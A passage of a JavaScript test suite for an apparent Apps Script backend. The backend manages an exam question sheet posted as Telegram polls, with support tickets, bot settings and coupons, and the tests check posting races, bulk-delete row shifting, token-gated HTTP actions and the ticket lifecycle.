  // It may be in the channel: posting it again would double-post it.
  const { script, sheet, map } = sheetWithQuestions(1);
  script.claimQuestionRows('Polity', [2]);
  assert.equal(script.holdQuestionRows('Polity', [2], 'No answer from Telegram'), 1);

  assert.match(String(sheet.values[1][map['Posted']]), /^CHECK \|/);
  assert.equal(sheet.values[1][map['Status']], 'Sending');
  assert.match(String(sheet.values[1][map['Review Notes']]), /No answer from Telegram/);

  const result = script.recoverStaleClaims('Polity', 0);
  assert.equal(result.recovered.length, 0, 'a held row was handed back');
  assert.equal(result.held, 1);
  assert.equal(script.fetchUnpostedQuestions('Polity', 10, true).length, 0, 'a held row is not eligible');
});

test('holding never touches a row that reached Posted', () => {
  const { script, sheet, map } = sheetWithQuestions(1);
  script.claimQuestionRows('Polity', [2]);
  script.markRowsAsPostedInSheet('Polity', [2], '903', '6', {});

  assert.equal(script.holdQuestionRows('Polity', [2], 'late failure'), 0);
  assert.equal(sheet.values[1][map['Posted']], 'YES');
});

test('releasing never clears a row that reached Posted in the meantime', () => {
  // The race: a slow release arriving after the send actually succeeded would
  // otherwise un-post a live poll and send it a second time.
  const { script, sheet, map } = sheetWithQuestions(1);

  script.claimQuestionRows('Polity', [2]);
  script.markRowsAsPostedInSheet('Polity', [2], '902', '6', {});

  assert.equal(script.releaseQuestionRows('Polity', [2], 'Approved'), 0);
  assert.equal(sheet.values[1][map['Posted']], 'YES');
});

// ===========================================================================
// A poll deleted in Telegram comes back to the queue
// ===========================================================================

test('listPosted returns only posted rows that carry a message id', () => {
  const { script } = sheetWithQuestions(3);

  script.markRowsAsPostedInSheet('Polity', [2], '900', '6', {});
  script.markRowsAsPostedInSheet('Polity', [3], '', '6', {});   // no message id

  const posted = Array.from(script.listPostedQuestions('Polity'));
  assert.equal(posted.length, 1, 'a row with no message id has nothing to check against');
  assert.equal(posted[0].row, 2);
  assert.equal(posted[0].message_id, '900');
});

test('un-posting clears the trail and makes the question eligible again', () => {
  const { script, sheet, map } = sheetWithQuestions(1);
  script.markRowsAsPostedInSheet('Polity', [2], '900', '6', { 2: 'poll-1' });

  assert.equal(script.fetchUnpostedQuestions('Polity', 10, true).length, 0);
  assert.equal(script.unpostQuestionRows('Polity', [2], 'Approved'), 1);

  assert.equal(sheet.values[1][map['Posted']], 'NO');
  assert.equal(sheet.values[1][map['Status']], 'Approved');
  assert.equal(sheet.values[1][map['Telegram Msg ID']], '', 'a dead message id was left behind');
  assert.equal(sheet.values[1][map['Poll ID']], '');
  // History: it did go out once, and that is not erased.
  assert.equal(sheet.values[1][map['Times Posted']], 1);
  assert.equal(script.fetchUnpostedQuestions('Polity', 10, true).length, 1);
});

// ===========================================================================
// Bulk delete
// ===========================================================================
// Deleting a row shifts every row below it up by one, so resolving row numbers
// and then deleting in the order the ids arrived destroys the wrong rows from
// the second deletion onwards.

test('bulk delete removes exactly the selected rows, not their neighbours', () => {
  // The hazard: deleting a row shifts every row below it up by one. Resolving
  // row numbers first and then deleting in the order the ids arrived destroys
  // the wrong rows from the second deletion onwards. This deletes a middle
  // slice, so an off-by-one in either direction leaves the wrong survivors.
  const s = freshScript();
  const sheet = new FakeSheet('Polity', [s.QUESTION_HEADERS.slice()]);
  const script = loadScript(new FakeSpreadsheet([sheet]));

  const six = [1, 2, 3, 4, 5, 6].map((n) => ({
    question: `Q${n}?`, option_a: 'a', option_b: 'b', option_c: 'c', option_d: 'd', correct_answer: 'A'
  }));
  script.appendQuestionsToSheet('Polity', six, 'Curator', true);

  const map = script.headerMap(sheet);
  const idAt = (row) => String(sheet.values[row][map['Question ID']]);
  const idsFor = (rows) => rows.map(idAt);

  // Rows 2..7 hold Q1..Q6. Delete Q2, Q3 and Q5 — deliberately not contiguous.
  const target = idsFor([2, 3, 5]);
  const result = script.bulkDeleteQuestionRows('Polity', target);

  assert.equal(result.deletedCount, 3);
  // Array.from: the sandbox has its own realm, so its arrays fail the strict
  // prototype check even when the contents match.
  assert.deepEqual(Array.from(result.notFound), []);

  const surviving = Array.from(sheet.values).slice(1).map((r) => String(r[map['Question']]));
  assert.deepEqual(surviving, ['Q1?', 'Q4?', 'Q6?'],
    'the wrong rows were deleted — row numbers shifted mid-loop');
});

test('bulk delete reports ids it could not find and still deletes the rest', () => {
  const s = freshScript();
  const sheet = new FakeSheet('Polity', [s.QUESTION_HEADERS.slice()]);
  const script = loadScript(new FakeSpreadsheet([sheet]));

  script.appendQuestionsToSheet('Polity', [
    { question: 'Keep me?', option_a: 'a', option_b: 'b', option_c: 'c', option_d: 'd', correct_answer: 'A' },
    { question: 'Delete me?', option_a: 'a', option_b: 'b', option_c: 'c', option_d: 'd', correct_answer: 'A' }
  ], 'Curator', true);

  const map = script.headerMap(sheet);
  const doomed = String(sheet.values[2][map['Question ID']]);

  const result = script.bulkDeleteQuestionRows('Polity', [doomed, 'POL-DOES-NOT-EXIST']);

  assert.equal(result.deletedCount, 1);
  assert.deepEqual(Array.from(result.notFound), ['POL-DOES-NOT-EXIST']);
  assert.equal(sheet.values.length, 2, 'only the header and the survivor should remain');
  assert.equal(String(sheet.values[1][map['Question']]), 'Keep me?');
});

test('bulk delete ignores a repeated id rather than deleting its neighbour', () => {
  // Deleting the same row twice would take out whatever slid up into its place.
  const s = freshScript();
  const sheet = new FakeSheet('Polity', [s.QUESTION_HEADERS.slice()]);
  const script = loadScript(new FakeSpreadsheet([sheet]));

  script.appendQuestionsToSheet('Polity', [
    { question: 'Go?', option_a: 'a', option_b: 'b', option_c: 'c', option_d: 'd', correct_answer: 'A' },
    { question: 'Stay?', option_a: 'a', option_b: 'b', option_c: 'c', option_d: 'd', correct_answer: 'A' }
  ], 'Curator', true);

  const map = script.headerMap(sheet);
  const doomed = String(sheet.values[1][map['Question ID']]);

  const result = script.bulkDeleteQuestionRows('Polity', [doomed, doomed, doomed]);

  assert.equal(result.deletedCount, 1);
  assert.equal(sheet.values.length, 2);
  assert.equal(String(sheet.values[1][map['Question']]), 'Stay?');
});

test('listQuestions filters and paginates', () => {
  const s = freshScript();
  const sheet = new FakeSheet('Polity', [s.QUESTION_HEADERS.slice()]);
  const script = loadScript(new FakeSpreadsheet([sheet]));

  script.appendQuestionsToSheet('Polity', [
    { question: 'Preamble question?', option_a: 'a', option_b: 'b', option_c: 'c', option_d: 'd', correct_answer: 'A', status: 'Approved', difficulty: 'Hard', tags: 'preamble' },
    { question: 'Monsoon question?', option_a: 'a', option_b: 'b', option_c: 'c', option_d: 'd', correct_answer: 'A', status: 'Draft', difficulty: 'Easy' },
    { question: 'Budget question?', option_a: 'a', option_b: 'b', option_c: 'c', option_d: 'd', correct_answer: 'A', status: 'Approved', difficulty: 'Easy' }
  ], 'Curator', true);

  assert.equal(script.listQuestions({ subject: 'Polity' }).total, 3);
  assert.equal(script.listQuestions({ subject: 'Polity', status: 'Approved' }).total, 2);
  assert.equal(script.listQuestions({ subject: 'Polity', difficulty: 'Easy' }).total, 2);
  assert.equal(script.listQuestions({ subject: 'Polity', posted: 'NO' }).total, 3);
  assert.equal(script.listQuestions({ subject: 'Polity', posted: 'YES' }).total, 0);

  // Search covers question text and tags, case-insensitively.
  assert.equal(script.listQuestions({ subject: 'Polity', search: 'MONSOON' }).total, 1);
  assert.equal(script.listQuestions({ subject: 'Polity', search: 'preamble' }).total, 1);

  const page = script.listQuestions({ subject: 'Polity', pageSize: '2', page: '2' });
  assert.equal(page.questions.length, 1, 'second page holds the remainder');
  assert.equal(page.totalPages, 2);
});

// ===========================================================================
// Authentication
// ===========================================================================

test('requireToken is open when no API_TOKEN is configured', () => {
  delete scriptProperties.API_TOKEN;
  const s = freshScript();
  assert.equal(s.requireToken(''), null, 'requests pass when no token is set');
  assert.equal(s.getApiToken(), '');
});

test('requireToken rejects a wrong or missing token once configured', () => {
  scriptProperties.API_TOKEN = 'the-real-secret';
  try {
    const s = freshScript();
    assert.equal(s.requireToken('the-real-secret'), null, 'the correct token is accepted');

    for (const bad of ['', 'wrong', 'the-real-secre', 'the-real-secrets', undefined]) {
      const response = s.requireToken(bad);
      assert.ok(response, `token ${JSON.stringify(bad)} was accepted`);
      assert.match(JSON.parse(response.text).error, /Unauthorized/);
    }
  } finally {
    delete scriptProperties.API_TOKEN;
  }
});

test('doGet answers ping without a token but gates everything else', () => {
  scriptProperties.API_TOKEN = 'the-real-secret';
  try {
    const s = freshScript();

    const ping = JSON.parse(s.doGet({ parameter: { action: 'ping' } }).text);
    assert.equal(ping.status, 'ok');
    assert.match(ping.version, /^v6/);
    assert.equal(ping.tokenRequired, true);

    const denied = JSON.parse(s.doGet({ parameter: { action: 'getStats' } }).text);
    assert.equal(denied.success, false);
    assert.match(denied.error, /Unauthorized/);
  } finally {
    delete scriptProperties.API_TOKEN;
  }
});

test('doPost refuses a write without the token', () => {
  scriptProperties.API_TOKEN = 'the-real-secret';
  try {
    const s = freshScript();
    const response = JSON.parse(s.doPost({
      postData: { contents: JSON.stringify({ action: 'addQuestions', subject: 'Polity', questions: [{ question: 'x' }] }) }
    }).text);
    assert.equal(response.success, false);
    assert.match(response.error, /Unauthorized/);
  } finally {
    delete scriptProperties.API_TOKEN;
  }
});

test('ping reports whether the script is attached to a spreadsheet', () => {
  const bound = freshScript();
  const okPing = JSON.parse(bound.doGet({ parameter: { action: 'ping' } }).text);
  assert.equal(okPing.boundToSpreadsheet, true);
  assert.equal(okPing.spreadsheetName, 'Sadhana APPSC Questions Tracker');
});

test('a standalone script reports unbound and explains the fix', () => {
  // The exact failure the user hit: code pasted into a new "Untitled project"
  // at script.google.com instead of into the Sheet's own bound script.
  const standalone = loadScript(null);

  const ping = JSON.parse(standalone.doGet({ parameter: { action: 'ping' } }).text);
  assert.equal(ping.boundToSpreadsheet, false, 'an unbound script must say so');
  assert.match(ping.message, /NOT attached to a spreadsheet/);

  // Any real action fails with actionable guidance, not a null dereference.
  const stats = JSON.parse(standalone.doGet({ parameter: { action: 'getStats' } }).text);
  assert.equal(stats.success, false);
  assert.match(stats.error, /Extensions > Apps Script/);
  assert.match(stats.error, /SPREADSHEET_ID/);
});

test('SPREADSHEET_ID lets a standalone script reach the sheet anyway', () => {
  scriptProperties.SPREADSHEET_ID = 'known-sheet-id';
  try {
    const standalone = loadScript(null);
    const ping = JSON.parse(standalone.doGet({ parameter: { action: 'ping' } }).text);
    assert.equal(ping.boundToSpreadsheet, true);
    assert.equal(ping.spreadsheetName, 'Opened By Id');
  } finally {
    delete scriptProperties.SPREADSHEET_ID;
  }
});

test('doGet reports an unknown action instead of throwing', () => {
  const s = freshScript();
  const response = JSON.parse(s.doGet({ parameter: { action: 'definitelyNotAnAction' } }).text);
  assert.equal(response.success, false);
  assert.match(response.error, /Unknown GET action/);
});

test('listQuestions counts the whole filter, not the page it returns', () => {
  // The bug this covers: the dashboard counted the rows it had been handed, so
  // with 303 matches and a 200-row page "Posted" read 200 — a fact about the
  // pagination rather than the question bank, which changed on pressing Next.
  const s = freshScript();
  const sheet = new FakeSheet('Polity', [s.QUESTION_HEADERS.slice()]);
  const script = loadScript(new FakeSpreadsheet([sheet]));

  script.appendQuestionsToSheet('Polity', [
    { question: 'Alpha?', option_a: 'a', option_b: 'b', option_c: 'c', option_d: 'd', correct_answer: 'A', status: 'Approved', explanation: 'why', topic: 'Polity' },
    { question: 'Beta?', option_a: 'a', option_b: 'b', option_c: 'c', option_d: 'd', correct_answer: 'A', status: 'Approved', explanation: 'why', topic: 'Polity' },
    { question: 'Gamma?', option_a: 'a', option_b: 'b', option_c: 'c', option_d: 'd', correct_answer: 'A', status: 'Draft' },
    { question: 'Delta?', option_a: 'a', option_b: 'b', option_c: 'c', option_d: 'd', correct_answer: 'A', status: 'Draft' }
  ], 'Curator', true);

  const all = script.listQuestions({ subject: 'Polity' });
  assert.equal(all.total, 4);
  assert.equal(all.counts.approved, 2);
  // Gamma and Delta were added with neither an explanation nor a topic.
  assert.equal(all.counts.needsDetail, 2);

  // The heart of it: one row per page, and the counts still describe all four.
  for (const page of [1, 2, 3, 4]) {
    const slice = script.listQuestions({ subject: 'Polity', pageSize: '1', page: String(page) });
    assert.equal(slice.questions.length, 1, `page ${page} holds one row`);
    assert.deepEqual(slice.counts, all.counts, `page ${page} reported page-scoped counts`);
  }
});

test('listQuestions counts posted rows across the whole filter', () => {
  const s = freshScript();
  const sheet = new FakeSheet('Polity', [s.QUESTION_HEADERS.slice()]);
  const script = loadScript(new FakeSpreadsheet([sheet]));

  script.appendQuestionsToSheet('Polity', [
    { question: 'One?', option_a: 'a', option_b: 'b', option_c: 'c', option_d: 'd', correct_answer: 'A' },
    { question: 'Two?', option_a: 'a', option_b: 'b', option_c: 'c', option_d: 'd', correct_answer: 'A' },
    { question: 'Three?', option_a: 'a', option_b: 'b', option_c: 'c', option_d: 'd', correct_answer: 'A' }
  ], 'Curator', true);

  const map = script.headerMap(sheet);
  // A legacy "YES | timestamp" cell counts as posted, the same as elsewhere.
  sheet.values[1][map['Posted']] = 'YES';
  sheet.values[2][map['Posted']] = 'YES | 2026-09-08 10:00:00';

  const first = script.listQuestions({ subject: 'Polity', pageSize: '1', page: '1' });
  assert.equal(first.counts.posted, 2, 'counted only the single row on the page');
  assert.equal(first.total, 3);
});

// ===========================================================================
// Support tickets and bot settings
// ===========================================================================

function newTicket(overrides) {
  return Object.assign({
    ticket_id: 'T-260917-AB2C',
    telegram_id: '7234356929',
    username: 'student',
    name: 'A Student',
    category: 'payment',
    bot: 'TELEGRAM_PAYBOT_UPSC',
    message: 'I paid but got no link'
  }, overrides || {});
}

test('the Support and Bot Settings tabs are never mistaken for question subjects', () => {
  const script = freshScript();
  script.createTicket(newTicket());
  script.updateBotSettings({ support_hours: '24x7' }, 'admin');
  script.book().insertSheet('Polity');

  const subjects = Array.from(script.listSubjectSheets());
  assert.deepEqual(subjects, ['Polity']);
});

test('createTicket opens a ticket and a repeated delivery does not open a second', () => {
  const script = freshScript();

  const first = script.createTicket(newTicket());
  assert.equal(first.status, 'open');
  assert.equal(first.telegram_id, '7234356929');
  assert.match(first.conversation, /@student:\nI paid but got no link/);

  const again = script.createTicket(newTicket({ message: 'a retry' }));
  assert.equal(again.ticket_id, first.ticket_id);
  assert.equal(again.last_message, 'I paid but got no link', 'a retry overwrote the original ticket');
  assert.equal(script.book().getSheetByName('Support').getLastRow(), 2, 'header plus one ticket');
});

test('appendTicketMessage grows the thread; an admin message picks the ticket up, a student one never closes it', () => {
  const script = freshScript();
  script.createTicket(newTicket());

  const answered = script.appendTicketMessage('T-260917-AB2C', 'Admin @helper', 'Resent your link', '', '@helper');
  assert.equal(answered.status, 'in_progress');
  assert.equal(answered.waiting_on, 'student');
  assert.equal(answered.last_message, 'Resent your link');
  assert.equal(answered.handled_by, '@helper');
  assert.equal(answered.picked_up_by, '@helper');
  assert.ok(answered.first_reply_at);
  assert.match(answered.conversation, /I paid but got no link[\s\S]*Admin @helper:\nResent your link/);

  // A caller asking for "closed" through a message is ignored: only setTicketStatus closes.
  const student = script.appendTicketMessage('T-260917-AB2C', 'A Student', 'thanks', 'closed');
  assert.equal(student.status, 'in_progress');
  assert.equal(student.waiting_on, 'admin');

  assert.equal(script.appendTicketMessage('T-000000-NONE', 'x', 'y'), null);
});

test('a long thread is trimmed from the oldest end to fit one cell', () => {
  const script = freshScript();
  script.createTicket(newTicket({ message: 'FIRST MESSAGE' }));
  const chunk = 'x'.repeat(3000);
  let ticket;
  for (let i = 0; i < 20; i++) ticket = script.appendTicketMessage('T-260917-AB2C', 'someone', chunk + i);

  assert.ok(ticket.conversation.length <= script.MAX_CONVERSATION_CHARS + 40, 'the thread outgrew a sheet cell');
  assert.ok(!ticket.conversation.includes('FIRST MESSAGE'), 'the oldest message should be the one dropped');
  assert.ok(ticket.conversation.endsWith(chunk + 19), 'the newest message must survive');
});

test('setTicketStatus accepts only known statuses', () => {
  const script = freshScript();
  script.createTicket(newTicket());

  assert.equal(script.setTicketStatus('T-260917-AB2C', 'CLOSED', 'admin@example.com').status, 'closed');
  assert.throws(() => script.setTicketStatus('T-260917-AB2C', 'deleted'), /Status must be one of/);
  assert.equal(script.setTicketStatus('T-000000-NONE', 'open'), null);
});

test('listTickets is newest first, filters, counts every status and leaves threads out', () => {
  const script = freshScript();
  script.createTicket(newTicket({ ticket_id: 'T-260917-AAAA', telegram_id: '1', message: 'first' }));
  script.createTicket(newTicket({ ticket_id: 'T-260917-BBBB', telegram_id: '2', message: 'second refund' }));
  script.createTicket(newTicket({ ticket_id: 'T-260917-CCCC', telegram_id: '3', message: 'third' }));
  script.setTicketStatus('T-260917-CCCC', 'closed');

  const all = script.listTickets({});
  assert.deepEqual(Array.from(all.tickets, (t) => t.ticket_id), ['T-260917-CCCC', 'T-260917-BBBB', 'T-260917-AAAA']);
  assert.equal(all.counts.open, 2);
  assert.equal(all.counts.closed, 1);
  assert.equal(all.counts.total, 3);
  assert.ok(all.tickets.every((t) => t.conversation === ''), 'the list should not carry whole threads');

  assert.equal(script.listTickets({ status: 'open' }).total, 2);
  assert.equal(script.listTickets({ search: 'refund' }).tickets[0].ticket_id, 'T-260917-BBBB');
  assert.equal(script.listTickets({ telegramId: '1' }).total, 1);
  assert.equal(script.getTicket('T-260917-AAAA').conversation.includes('first'), true);
});

test('updateBotSettings upserts by key and refuses malformed keys', () => {
  const script = freshScript();

  script.updateBotSettings({ support_hours: '9-5', welcome_note: 'Hi' }, 'a@example.com');
  const after = script.updateBotSettings({ support_hours: '24x7' }, 'b@example.com');
  assert.equal(after.support_hours, '24x7');
  assert.equal(after.welcome_note, 'Hi', 'a key that was not sent must be left alone');

  const sheet = script.book().getSheetByName('Bot Settings');
  assert.equal(sheet.getLastRow(), 3, 'header plus one row per key, not per save');

  assert.throws(() => script.updateBotSettings({ 'bad key!': 'x' }, 'a'), /Invalid setting key/);
  assert.equal(script.getBotSettings().support_hours, '24x7');
});

test('the support actions are routed over HTTP and still require the token', () => {
  const script = freshScript();
  scriptProperties.API_TOKEN = 'secret-token';
  try {
    const denied = JSON.parse(script.doGet({ parameter: { action: 'listTickets' } }).text);
    assert.equal(denied.success, false, 'listTickets answered without a token');

    const created = JSON.parse(script.doPost({ postData: { contents: JSON.stringify({
      action: 'createTicket', token: 'secret-token', ticket: newTicket()
    }) } }).text);
    assert.equal(created.success, true, created.error);

    const listed = JSON.parse(script.doGet({ parameter: { action: 'listTickets', token: 'secret-token' } }).text);
    assert.equal(listed.data.total, 1);

    const missing = JSON.parse(script.doPost({ postData: { contents: JSON.stringify({
      action: 'appendTicketMessage', token: 'secret-token', ticketId: 'T-260917-AB2C'
    }) } }).text);
    assert.equal(missing.success, false, 'an empty message should be refused');

    const saved = JSON.parse(script.doPost({ postData: { contents: JSON.stringify({
      action: 'updateBotSettings', token: 'secret-token', settings: { support_hours: 'always' }, updated_by: 'x'
    }) } }).text);
    assert.equal(saved.data.support_hours, 'always');

    const read = JSON.parse(script.doGet({ parameter: { action: 'getBotSettings', token: 'secret-token' } }).text);
    assert.equal(read.data.support_hours, 'always');
  } finally {
    delete scriptProperties.API_TOKEN;
  }
});

// ===========================================================================
// Support Log, ticket columns and coupons
// ===========================================================================

test('every ticket action is written to the Support Log with who did it and the status after', () => {
  const script = freshScript();
  script.createTicket(newTicket());
  script.appendTicketMessage('T-260917-AB2C', 'A Student', 'still waiting');
  script.logTicketEvent('T-260917-AB2C', '@ravi', 'admin', 'payment_checked', 'pay_1 captured ₹199');
  script.appendTicketMessage('T-260917-AB2C', 'Admin @ravi', 'Resent the link', '', '@ravi', 'invite_sent');
  script.appendTicketMessage('T-260917-AB2C', 'A Student', 'in now, thanks');
  script.setTicketStatus('T-260917-AB2C', 'closed', '@ravi');
  script.appendTicketMessage('T-260917-AB2C', 'A Student', 'one more thing');

  const log = script.getTicket('T-260917-AB2C').log;
  assert.deepEqual(Array.from(log, (e) => [e.who, e.role, e.action, e.status_after]), [
    ['@student', 'student', 'ticket_opened', 'open'],
    ['A Student', 'student', 'student_message', 'open'],
    ['@ravi', 'admin', 'picked_up', 'in_progress'],
    ['@ravi', 'admin', 'payment_checked', 'in_progress'],
    ['@ravi', 'admin', 'invite_sent', 'in_progress'],
    ['A Student', 'student', 'student_message', 'in_progress'],
    ['@ravi', 'admin', 'closed', 'closed'],
    ['A Student', 'student', 'reopened', 'in_progress'],
    ['A Student', 'student', 'student_message', 'in_progress']
  ]);
});

test('the ticket row tracks admin replies and who closed it', () => {
  const script = freshScript();
  script.createTicket(newTicket());
  script.appendTicketMessage('T-260917-AB2C', 'Admin @ravi', 'first', 'answered', '@ravi');
  script.appendTicketMessage('T-260917-AB2C', 'Admin @sita', 'second', 'answered', '@sita');

  let ticket = script.getTicket('T-260917-AB2C');
  assert.equal(ticket.admin_replies, 2);
  assert.ok(ticket.last_admin_reply_at);
  assert.equal(ticket.handled_by, '@sita');

  ticket = script.setTicketStatus('T-260917-AB2C', 'closed', '@sita');
  assert.equal(ticket.closed_by, '@sita');
  assert.ok(ticket.closed_at);

  ticket = script.setTicketStatus('T-260917-AB2C', 'open', '@ravi');
  assert.equal(ticket.closed_by, '', 'reopening must clear who closed it');
  assert.equal(ticket.closed_at, '');
});

test('a Support tab from an older version is upgraded: new columns, answered → in_progress, rows filled in', () => {
  const oldHeaders = ['Ticket ID', 'Created At', 'Updated At', 'Telegram ID', 'Username', 'Name',
    'Category', 'Status', 'Bot', 'Last Message', 'Conversation', 'Handled By', 'Admin Replies', 'Last Admin Reply At',
    'Closed At', 'Closed By'];
  const old = new FakeSheet('Support', [
    oldHeaders,
    ['T-260917-OLD1', 'x', 'x', '42', 'asha', 'Asha', 'invite', 'open', 'TELEGRAM_PAYBOT_UPSC', 'hi', '[t] a:\nhi', '', 0, '', '', ''],
    ['T-260917-OLD2', 'x', 'x', '43', 'ravi', 'Ravi', 'payment', 'answered', 'TELEGRAM_PAYBOT_UPSC', 'sent', '', '@sita', 2, '17-09-2026, 10:00:00 AM IST', '', ''],
    ['T-260917-OLD3', 'x', 'x', '44', '', '', 'other', 'closed', 'TELEGRAM_PAYBOT_UPSC', 'ok', '', '@sita', 1, 'y', 'z', '@sita']
  ]);
  const script = loadScript(new FakeSpreadsheet([old]));

  const first = script.getTicket('T-260917-OLD1');
  assert.equal(first.status, 'open');
  assert.equal(first.waiting_on, 'admin');

  const second = script.getTicket('T-260917-OLD2');
  assert.equal(second.status, 'in_progress');
  assert.equal(second.waiting_on, 'student');
  assert.equal(second.picked_up_by, '@sita');
  assert.equal(second.first_reply_at, '17-09-2026, 10:00:00 AM IST');
  assert.equal(old.values[2][7], 'in_progress', 'the stored status must be migrated, not only read differently');

  const third = script.getTicket('T-260917-OLD3');
  assert.equal(third.status, 'closed');
  assert.equal(third.waiting_on, '');

  assert.equal(old.values[0].length, script.SUPPORT_HEADERS.length);
  assert.equal(old.values[0][16], 'Waiting On');
  assert.match(old.notes['1,8'], /in_progress = In progress/);
  assert.match(old.notes['1,17'], /admin = the student wrote last/);
});

test('an admin can start a conversation, which starts in progress and waiting for the student', () => {
  const script = freshScript();
  const ticket = script.createTicket(newTicket({ opened_by: '@ravi', message: 'Your pass is ready' }));
  assert.equal(ticket.status, 'in_progress');
  assert.equal(ticket.waiting_on, 'student');
  assert.equal(ticket.admin_replies, 1);
  assert.equal(ticket.picked_up_by, '@ravi');
  assert.match(ticket.conversation, /Admin @ravi:\nYour pass is ready/);
  assert.equal(script.getTicket(ticket.ticket_id).log[0].action, 'admin_started_conversation');
});

function newCoupon(overrides) {
  return Object.assign({
    code: 'save50', discount_type: 'flat', discount_value: 50, active: true,
    expires_on: '31-12-2026', max_uses: 100, one_per_student: true, note: 'launch'
  }, overrides || {});
}

test('upsertCoupon creates a code and an update keeps its usage and creator', () => {
  const script = freshScript();
  const created = script.upsertCoupon(newCoupon(), 'a@example.com');
  assert.equal(created.code, 'SAVE50');
  assert.equal(created.discount_value, 50);
  assert.equal(created.expires_on, '31-12-2026', 'the date must survive as text');
  assert.equal(created.max_uses, 100);
  assert.equal(created.one_per_student, true);

  script.recordRedemption({ code: 'SAVE50', telegram_id: '42', payment_id: 'pay_1', paid_amount: 149 });
  const updated = script.upsertCoupon(newCoupon({ code: 'Save50', discount_value: 60, active: 'no', max_uses: '' }), 'b@example.com');
  assert.equal(updated.discount_value, 60);
  assert.equal(updated.active, false);
  assert.equal(updated.max_uses, null, 'a blank limit means unlimited');
  assert.equal(updated.times_used, 1, 'editing a code must not reset its usage');
  assert.equal(updated.created_by, 'a@example.com');
  assert.equal(updated.updated_by, 'b@example.com');
  assert.equal(script.listCoupons().length, 1, 'codes are matched regardless of case');
});

test('upsertCoupon refuses a malformed code or type', () => {
  const script = freshScript();
  assert.throws(() => script.upsertCoupon(newCoupon({ code: 'no spaces' }), 'x'), /Invalid coupon code/);
  assert.throws(() => script.upsertCoupon(newCoupon({ code: 'AB' }), 'x'), /Invalid coupon code/);
  assert.throws(() => script.upsertCoupon(newCoupon({ discount_type: 'free' }), 'x'), /percent or flat/);
});

test('a redemption is counted once per payment and tracked per student', () => {
  const script = freshScript();
  script.upsertCoupon(newCoupon(), 'x');

  assert.deepEqual({ ...script.recordRedemption({ code: 'save50', telegram_id: '42', payment_id: 'pay_1' }) },
    { recorded: true, times_used: 1 });
  assert.deepEqual({ ...script.recordRedemption({ code: 'SAVE50', telegram_id: '42', payment_id: 'pay_1' }) },
    { recorded: false, times_used: 1 }, 'a repeated webhook counted twice');
  script.recordRedemption({ code: 'SAVE50', telegram_id: '43', payment_id: 'pay_2' });

  assert.equal(script.getCoupon('SAVE50', '42').used_by_student, 1);
  assert.equal(script.getCoupon('save50', '99').used_by_student, 0);
  assert.equal(script.getCoupon('SAVE50').times_used, 2);
  assert.equal(script.getCoupon('NOPE'), null);

  const list = script.listRedemptions({ code: 'save50' });
  assert.equal(list.total, 2);
  assert.equal(list.redemptions[0].payment_id, 'pay_2', 'newest first');
});

test('a used coupon cannot be deleted, an unused one can', () => {
  const script = freshScript();
  script.upsertCoupon(newCoupon({ code: 'USED1' }), 'x');
  script.upsertCoupon(newCoupon({ code: 'FRESH1' }), 'x');
  script.recordRedemption({ code: 'USED1', telegram_id: '42', payment_id: 'pay_9' });

  const refused = script.deleteCoupon('USED1');
  assert.equal(refused.deleted, false);
  assert.match(refused.reason, /Switch it off instead/);
  assert.equal(script.deleteCoupon('fresh1').deleted, true);
  assert.deepEqual(Array.from(script.listCoupons(), (c) => c.code), ['USED1']);
});

test('coupon and log tabs are never mistaken for question subjects', () => {
  const script = freshScript();
  script.setupSupportSheets();
  script.book().insertSheet('Polity');
  assert.deepEqual(Array.from(script.listSubjectSheets()), ['Polity']);
});

test('the coupon actions are routed over HTTP behind the token', () => {
  const script = freshScript();
  scriptProperties.API_TOKEN = 'secret-token';
  try {
    const post = (body) => JSON.parse(script.doPost({ postData: { contents: JSON.stringify(Object.assign({ token: 'secret-token' }, body)) } }).text);
    const get = (params) => JSON.parse(script.doGet({ parameter: Object.assign({ token: 'secret-token' }, params) }).text);

    assert.equal(JSON.parse(script.doGet({ parameter: { action: 'listCoupons' } }).text).success, false);
    assert.equal(post({ action: 'upsertCoupon', coupon: newCoupon(), updated_by: 'x' }).data.code, 'SAVE50');
    assert.equal(get({ action: 'getCoupon', code: 'save50', telegramId: '42' }).data.used_by_student, 0);
    assert.equal(post({ action: 'recordRedemption', redemption: { code: 'SAVE50', telegram_id: '42', payment_id: 'pay_1' } }).data.recorded, true);
    assert.equal(get({ action: 'listRedemptions' }).data.total, 1);
    assert.equal(get({ action: 'listCoupons' }).data[0].times_used, 1);
    assert.equal(post({ action: 'deleteCoupon', code: 'SAVE50' }).data.deleted, false);
    assert.equal(post({ action: 'logTicketEvent', ticketId: 'T-000000-NONE', logAction: 'x' }).data, null);
  } finally {
    delete scriptProperties.API_TOKEN;
  }
});

// ===========================================================================
// Ticket lifecycle: open → in_progress → closed, and only an admin closes
// ===========================================================================

test('a new ticket is open and waiting on an admin until an admin acts', () => {
  const script = freshScript();
  const ticket = script.createTicket(newTicket());
  assert.equal(ticket.status, 'open');
  assert.equal(ticket.waiting_on, 'admin');
  assert.equal(ticket.picked_up_by, '');

  const followUp = script.appendTicketMessage('T-260917-AB2C', 'A Student', 'hello?');
  assert.equal(followUp.status, 'open', 'a student writing again must not change open');
});

test('a non-message admin action picks the ticket up but keeps it waiting on the admin', () => {
  const script = freshScript();
  script.createTicket(newTicket());
  const checked = script.logTicketEvent('T-260917-AB2C', '@ravi', 'admin', 'payment_checked', 'pay_1 failed');
  assert.equal(checked.status, 'in_progress');
  assert.equal(checked.picked_up_by, '@ravi');
  assert.equal(checked.waiting_on, 'admin', 'the student has not been told anything yet');
  assert.equal(checked.first_reply_at, '');

  // Picked up once; a second admin does not replace who picked it up.
  script.appendTicketMessage('T-260917-AB2C', 'Admin @sita', 'hi', '', '@sita');
  assert.equal(script.getTicket('T-260917-AB2C').picked_up_by, '@ravi');
});

test('only an explicit close closes; closing twice changes nothing', () => {
  const script = freshScript();
  script.createTicket(newTicket());
  script.appendTicketMessage('T-260917-AB2C', 'Admin @ravi', 'done?', '', '@ravi');
  script.appendTicketMessage('T-260917-AB2C', 'A Student', 'yes, solved');
  assert.equal(script.getTicket('T-260917-AB2C').status, 'in_progress', 'a student saying solved must not close it');

  const closed = script.setTicketStatus('T-260917-AB2C', 'closed', '@ravi');
  assert.equal(closed.status, 'closed');
  assert.equal(closed.waiting_on, '');
  assert.equal(closed.closed_by, '@ravi');
  assert.ok(closed.closed_at);

  const again = script.setTicketStatus('T-260917-AB2C', 'closed', '@sita');
  assert.equal(again.closed_by, '@ravi', 'a second close must not rewrite who closed it');
  assert.equal(script.getTicket('T-260917-AB2C').log.filter((e) => e.action === 'closed').length, 1);
});

